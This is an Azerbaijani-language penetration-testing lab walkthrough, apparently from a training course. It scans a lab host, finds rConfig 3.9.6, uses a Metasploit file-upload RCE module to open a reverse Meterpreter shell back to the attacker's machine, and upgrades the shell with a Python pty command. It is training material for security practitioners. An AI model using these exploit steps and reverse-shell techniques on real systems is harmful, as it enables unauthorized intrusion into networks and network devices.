**Unix/Linux-a Daxil Olmaq**

W3Techs davamlı olaraq ƏS istifadə statistikası araşdırması aparır. Bu araşdırma vebsaytların (veb serverlərinin) 70%-dən çoxunun Unix əsaslı sistemdə işlədiyini bildirir. Bu bizim üçün o deməkdir ki, Unix/Linux haqqında biliklərimizi artırmaqla və bu mühitlərdə shell sessiyaları necə əldə edə biləcəyimizi öyrənməklə əhəmiyyətli dərəcədə faydalanmaq olar, bu da potensial olaraq mühit daxilində daha da irəliləməyimizə kömək edə bilər. Təşkilatların vebsaytlarını və veb tətbiqlərini host etmək üçün 3-cü tərəflərdən və bulud provayderlərindən istifadə etməsi çox yaygın olsa da, bir çox təşkilat hələ də vebsaytlarını və veb tətbiqlərini şəbəkə mühitlərindəki (on-prem) serverlərdə host edir. Bu hallarda, biz daxili şəbəkədəki digər sistemlərə keçid etməyə cəhd etmək üçün əsas sistemlə shell sessiyası qurmaq istəyərik.

**Ümumi Məsələlər**

Artıq çox yəqin ki, fərqinə varmısınız ki, sistemlə shell sessiyası əldə etmək müxtəlif yollarla həyata keçirilə bilər, bunlardan biri də tətbiqdəki bir təhlükəsizlik boşluğudur. Biz bir təhlükəsizlik boşluğu müəyyən edəcəyik və payload çatdırmaqla shell əldə etmək üçün istifadə edə biləcəyimiz bir eksploit kəşf edəcəyik. Unix/Linux sistemində shell sessiyası necə quracağımızı düşünərkən, aşağıdakıları nəzərə almaq bizim faydamıza olacaq:

*   Sistem hansı Linux distributivini işlədir?
*   Sistemdə hansı shell və proqramlaşdırma dilləri mövcuddur?
*   Sistem olduğu şəbəkə mühitində hansı funksiyanı yerinə yetirir?
*   Sistem hansı tətbiqi host edir?
*   Heç bir məlum təhlükəsizlik boşluğu varmı?

Gəlin bu anlayışı daha dərinə işləmək üçün Linux sistemində host olunan həssas bir tətbiqə hücum edək. Bu sualları nəzərdə saxlayın və gedərkən qeydlər aparın. Onlara cavab verə bilərsinizmi?

**Həssas Tətbiqə Hücum Edərək Shell Əldə Etmək**

Əksər işlərdə olduğu kimi, biz sistemin ilkin sadalanmasına Nmap istifadə edərək başlayacağıq.

**Hostu Sadalayın**
```bash
nijatmansimov@htb[/htb]$ nmap -sC -sV 10.129.201.101

Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-27 09:09 EDT
Nmap scan report for 10.129.201.101
Host is up (0.11s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 2.0.8 or later
22/tcp   open  ssh      OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 2d:b2:23:75:87:57:b9:d2:dc:88:b9:f4:c1:9e:36:2a (RSA)
|   256 c4:88:20:b0:22:2b:66:d0:8e:9d:2f:e5:dd:32:71:b1 (ECDSA)
|_  256 e3:2a:ec:f0:e4:12:fc:da:cf:76:d5:43:17:30:23:27 (ED25519)
80/tcp   open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34
|_http-title: Did not follow redirect to https://10.129.201.101/
111/tcp  open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
443/tcp  open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2021-09-24T19:29:26
|_Not valid after:  2022-09-24T19:29:26
|_ssl-date: TLS randomness does not represent time
3306/tcp open  mysql    MySQL (unauthorized)
```

Shell sessiyası əldə etmək hədəfimizi nəzərə alaraq, skan nəticələrimizi yoxladıqdan sonra bəzi növbəti addımları müəyyən etməliyik.

**Çıxışdan hansı məlumatları toplaya bilərik?**

Sistemin 80 (HTTP), 443 (HTTPS), 3306 (MySQL) və 21 (FTP) portlarında dinlədiyini görə bilərik, ona görə də bunun veb tətbiq host edən veb server olduğunu fərz etmək təhlükəsiz ola bilər. Həmçinin veb yığını (Apache 2.4.6 və PHP 7.2.34) və sistemdə işləyən Linux distributivi (CentOS) ilə əlaqəli aşkar olunan bəzi versiya nömrələrini görə bilərik. Daha da araşdırmaq üçün istiqamət seçməzdən əvvəl (bir araşdırma dərinliyinə dalmadan), mümkünsə host olunan tətbiqi kəşf etmək üçün veb brauzer vasitəsilə IP ünvanına da daxil olmağa cəhd etməliyik.

**rConfig İdarəetmə Aləti**

Burada rConfig adlı şəbəkə konfiqurasiya idarəetmə alətini kəşf edirik. Bu tətbiq şəbəkə və sistem administratorları tərəfindən şəbəkə cihazlarının konfiqurasiya edilməsi prosesini avtomatlaşdırmaq üçün istifadə olunur. Praktik bir istifadə vəziyyəti, bir neçə router üzərində eyni vaxtda IP ünvan məlumatları ilə şəbəkə interfeyslərini uzaqdan konfiqurasiya etmək üçün rConfig-dən istifadə etmək olardı. Bu alət adminlərə vaxt qazandırır, lakin ələ keçirilsə, şəbəkə üzrə paketləri çevirən və yönləndirən kritik şəbəkə cihazlarına keçid etmək üçün istifadə edilə bilər. Zərərli bir hücumçu bütün şəbəkəyə rConfig vasitəsilə sahib ola bilər, çünki o, yəqin ki, konfiqurasiya etmək üçün istifadə olunan bütün şəbəkə cihazlarına admin girişinə malik olacaq. Pentesterlər kimi, bu tətbiqdə bir təhlükəsizlik boşluğu tapmaq çox kritik bir kəşf hesab olunardı.

<img width="1024" height="644" alt="image" src="https://github.com/user-attachments/assets/0cc2ace6-7ad0-41c2-b8c0-2a6a967f9eca" />

**rConfig-də Təhlükəsizlik Boşluğunun Kəşf Edilməsi**

Veb giriş səhifəsinin altına yaxından baxın və rConfig versiya nömrəsini (3.9.6) görə bilərik. Bu məlumatdan hər hansı CVE-lər, ictimai şəkildə mövcud olan eksploitlər və sübut olunmuş konsepsiyalar (PoC-lər) axtarmağa başlamalıyıq. Araşdırarkən, əmin olun ki, tapdığımız şeyə yaxından baxırıq və onun nə etdiyini başa düşürük. Əlbəttə ki, onun bizi hədəflə shell sessiyasına aparmasını istəyirik.

Seçdiyiniz axtarış motorundan istifadə bəzi ümidverici nəticələr verəcək. Açar sözlərdən istifadə edə bilərik: `rConfig 3.9.6 vulnerability`.

<img width="1024" height="659" alt="image" src="https://github.com/user-attachments/assets/1be85c45-e8e7-4844-a289-6340a4481b36" />

Bunun tədqiqatımızın əsas diqqət mərkəzi kimi seçməyə dəyər ola biləcəyini görə bilərik. Eyni məntiq Apache və PHP versiyalarına da tətbiq edilə bilər, lakin tətbiq veb yığını üzərində işlədiyi üçün gəlin görək rConfig üçün yazılmış təhlükəsizlik boşluqları üçün bir eksploit vasitəsilə shell əldə edə bilirikmi.

Həmçinin hədəfdə shell sessiyası əldə edə biləcək heç bir eksploit modulunun olub-olmadığını görmək üçün Metasploit-in axtarış funksionallığından istifadə edə bilərik.

**Eksploit Modulu Axtarın**
```
msf6 > search rconfig

Matching Modules
================

   #  Name                                             Disclosure Date  Rank       Check  Description
   -  ----                                             ---------------  ----       -----  -----------
   0  exploit/multi/http/solr_velocity_rce             2019-10-29       excellent  Yes    Apache Solr Remote Code Execution via Velocity Template
   1  auxiliary/gather/nuuo_cms_file_download          2018-10-11       normal     No     Nuuo Central Management Server Authenticated Arbitrary File Download
   2  exploit/linux/http/rconfig_ajaxarchivefiles_rce  2020-03-11       good       Yes    Rconfig 3.x Chained Remote Code Execution
   3  exploit/unix/webapp/rconfig_install_cmd_exec     2019-10-28       excellent  Yes    rConfig install Command Execution
```

MSF-dən müəyyən bir tətbiq üçün eksploit modulu tapmağa güvənərkən gözdən qaçırıla biləcək bir detal MSF-in versiyasıdır. Sistemimizdə quraşdırılmamış və ya sadəcə axtarışda görünməyən faydalı eksploit modulları ola bilər. Bu hallarda, Rapid 7-nin eksploit modulları üçün kodları github-da repolarında saxladığını bilmək yaxşıdır. Axtarış motorundan istifadə edərək daha spesifik axtarış edə bilərik: `rConfig 3.9.6 exploit metasploit github`

Bu axtarış bizi `rconfig_vendors_auth_file_upload_rce.rb` adlı bir eksploit modulunun mənbə koduna yönləndirə bilər. Bu eksploit bizə rConfig 3.9.6 işlədən hədəf Linux qutusunda shell sessiyası əldə etməyə kömək edə bilər. Əgər bu eksploit MSF axtarışında görünməyibsə, biz bu repodan kodu yerli hücum qutumuzda yerli MSF quraşdırmamızın istinad etdiyi qovluğa köçürüb saxlaya bilərik. Bunu etmək üçün hücum qutumuzda bu əmri verə bilərik:

**Locate**
```bash
nijatmansimov@htb[/htb]$ locate exploits
```

Çıxışda Metasploit Framework ilə əlaqəli qovluqları axtarırıq. Pwnbox-da, Metasploit eksploit modulları burada saxlanılır:

`/usr/share/metasploit-framework/modules/exploits`

Kodu bir fayla köçürüb GitHub repodunda saxladıqları yerə bənzər şəkildə `/usr/share/metasploit-framework/modules/exploits/linux/http` qovluğunda saxlaya bilərik. Həmçinin `apt update; apt install metasploit-framework` və ya yerli paket menecerinizdən istifadə edərək msf-i güncəlləndirməliyik. Eksploit modulunu tapıb endirdikdən sonra (biz `wget` istifadə edə bilərik) və ya GitHub-dan düzgün qovluğa köçürdükdən sonra, onu hədəfdə shell sessiyası əldə etmək üçün istifadə edə bilərik. Əgər onu yerli sistemimizdə bir fayla köçürsək, faylın `.rb` genişlənməsinə sahib olduğuna əmin olun. MSF-dəki bütün modullar Ruby dilində yazılıb.

**rConfig Eksploitindən İstifadə və Shell Əldə Etmək**

msfconsole-da, əmrdən istifadə edərək eksploiti manual yükləyə bilərik:

**Eksploit Seçin**
```
msf6 > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
```

Bu eksploit seçildikdə, seçimləri sadalaya, şəbəkə mühitimizə xas olan düzgün tənzimləmələri daxil edə və eksploiti başlada bilərik.

*Modulda indiyə qədər öyrəndiklərinizdən istifadə edərək eksploitlə əlaqəli seçimləri doldurun.*

**Eksploiti İcra Edin**
```
msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > exploit

[*] Started reverse TCP handler on 10.10.14.111:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] 3.9.6 of rConfig found !
[+] The target appears to be vulnerable. Vulnerable version of rConfig found !
[+] We successfully logged in !
[*] Uploading file 'olxapybdo.php' containing the payload...
[*] Triggering the payload ...
[*] Sending stage (39282 bytes) to 10.129.201.101
[+] Deleted olxapybdo.php
[*] Meterpreter session 1 opened (10.10.14.111:4444 -> 10.129.201.101:38860) at 2021-09-27 13:49:34 -0400

meterpreter > dir
Listing: /home/rconfig/www/images/vendor
========================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  673   fil   2020-09-03 05:49:58 -0400  ajax-loader.gif
100644/rw-r--r--  1027  fil   2020-09-03 05:49:58 -0400  cisco.jpg
100644/rw-r--r--  1017  fil   2020-09-03 05:49:58 -0400  juniper.jpg
```

Eksploitasiya prosesində göstərilən addımlardan görə bilərik ki, bu eksploit:

*   rConfig-in həssas versiyasını yoxlayır
*   rConfig veb girişi ilə autentifikasiya olunur
*   Reverse shell əlaqəsi üçün PHP əsaslı bir payload yükləyir
*   Payload-u silir
*   Bizə Meterpreter shell sessiyası qoyur

**Shell-lə Qarşılıqlı Əlaqə**
```
meterpreter > shell

Process 3958 created.
Channel 0 created.
dir
ajax-loader.gif  cisco.jpg  juniper.jpg
ls
ajax-loader.gif
cisco.jpg
juniper.jpg
```

Sankı daxil olub terminal açmışıq kimi hədəf sistemə giriş əldə etmək üçün sistem shell-inə (`shell`) düşə bilərik.

**Python ilə TTY Shell Yaradılması**

Sistem shell-inə düşəndə, heç bir promptun olmadığını görürük, buna baxmayaraq hələ də bəzi sistem əmrlərini verə bilirik. Bu, adətən qeyri-tty shell kimi istinad olunan bir shell-dir. Bu shell-lər məhdud funksionallığa malikdirlər və tez-tez `su` (istifadəçi dəyişdir) və `sudo` (super istifadəçi et) kimi vacib əmrlərdən istifadəmizi maneə törədə bilər, hansı ki, imtiyazları artırmaq istəsək, çox güman ki, ehtiyacımız olacaq. Bu baş verdi, çünki payload hədəfdə `apache` istifadəçisi tərəfindən icra olundu. Sessiyamız `apache` istifadəçisi kimi qurulub. Normalda, adminlər sistemə `apache` istifadəçisi kimi daxil olmur, ona görə də `apache` ilə əlaqəli mühit dəyişənlərində shell interpretator dilinin müəyyən edilməsinə ehtiyac yoxdur.

Əgər sistemdə mövcuddursa, Python istifadə edərək manual olaraq TTY shell yarada bilərik. Linux sistemlərində Python-un olub-olmadığını həmişə yoxlaya bilərik: `which python`. Python istifadə edərək TTY shell sessiyası yaratmaq üçün aşağıdakı əmri yazırıq:

**İnteraktiv Python**
```
python -c 'import pty; pty.spawn("/bin/sh")' 

sh-4.2$         
sh-4.2$ whoami
whoami
apache
```

Bu əmr python-dan `pty` modulunu import etmək, sonra bourne shell ikili faylını (`/bin/sh`) icra etmək üçün `pty.spawn` funksiyasından istifadə edir. İndi bizim promptumuz var (`sh-4.2$`) və sistem ətrafında istədiyimiz kimi hərəkət etmək üçün daha çox sistem əmrinə girişimiz var.
